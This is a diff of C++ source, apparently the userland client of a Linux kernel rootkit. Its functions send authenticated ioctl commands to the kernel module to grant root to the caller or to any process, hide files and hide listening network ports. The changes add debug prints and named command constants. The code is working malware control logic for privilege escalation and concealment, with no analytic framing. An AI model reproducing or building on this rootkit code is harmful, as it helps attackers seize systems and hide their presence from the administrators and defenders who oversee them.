@@ -9,6 +9,7 @@ int root_me() {
 
     s_args args;
     args.cmd = ROOT_ME;
+    std::cout << "root_me: send ioctl" << std::endl;
     int io = ioctl(sockfd, AUTH_TOKEN, &args);
     
     close(sockfd);
@@ -23,8 +24,9 @@ int set_proc_root(pid_t pid) {
     }
     
     s_args args;
-    args.cmd = 1;
+    args.cmd = ARB_ROOT;
     args.ptr = &pid;
+    std::cout << "set_proc_root: send ioctl" << std::endl;
     int io = ioctl(sockfd, AUTH_TOKEN, &args);
 
     close(sockfd);
@@ -43,8 +45,9 @@ int hide_filename(const char *fname) {
     std::memset(buf, 0, sizeof(buf));
     std::strncpy(buf, fname, sizeof(buf) - 1);
     
-    args.cmd = 2;
+    args.cmd = HIDE_FILE;
     args.ptr = buf;
+    std::cout << "hide_filename: send ioctl" << std::endl;
     int io = ioctl(sockfd, AUTH_TOKEN, &args);
 
     close(sockfd);
@@ -59,8 +62,9 @@ int hide_listening_socket(unsigned short portnum) {
     }
 
     s_args args;
-    args.cmd = 3;
+    args.cmd = HIDE_PORT;
     args.ptr = &portnum;
+    std::cout << "hide_listening_socket: send ioctl" << std::endl;
     int io = ioctl(sockfd, AUTH_TOKEN, &args);
 
     close(sockfd);
